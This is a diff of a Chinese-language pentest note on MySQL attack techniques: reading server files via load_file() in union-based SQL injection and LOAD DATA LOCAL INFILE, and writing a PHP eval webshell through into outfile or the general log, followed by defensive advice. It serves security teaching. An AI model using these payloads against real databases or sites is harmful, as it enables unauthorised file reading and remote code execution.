@@ -11,14 +11,14 @@ topics = ["Pentest"]
  * @Author: reber
  * @Mail: reber0ask@qq.com
  * @Date: 2019-04-10 10:45:00
- * @LastEditTime : 2020-04-29 16:58:30
+ * @LastEditTime : 2020-08-24 00:29:11
  -->
 
 ### 0x00 load_file() 读文件
 * 条件:
 
 ```
-1. 要有file_priv权限
+1. 要有file_priv权限: show global variables like '%secure%';
 2. 知道文件绝对路径
 3. 能使用union
 4. 对web目录有读权限  
@@ -41,7 +41,21 @@ topics = ["Pentest"]
     ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')
     ```
 
-### 0x01 into outfile getshell
+### 0x01 load data local infile 读文件
+* 条件:
+
+```
+MySQL8 中需要 SET GLOBAL local_infile=1;
+```
+
+* 语句
+
+```
+LOAD DATA LOCAL INFILE 'D:/pet.txt' INTO TABLE pet FIELDS TERMINATED BY '';
+select * from pet;
+```
+
+### 0x02 into outfile getshell
 * 条件：
 
 ```
@@ -94,7 +108,7 @@ select '<?php eval($_GET[g]);?>'             #写入shell
 set global general_log=off;                  #关闭general log模式
 ```
 
-### 0x02 防御
+### 0x03 防御
 * 数据库连接账号不要用root权限
 * php关闭报错模式
 * mysql账户没有权限向网站目录写文件
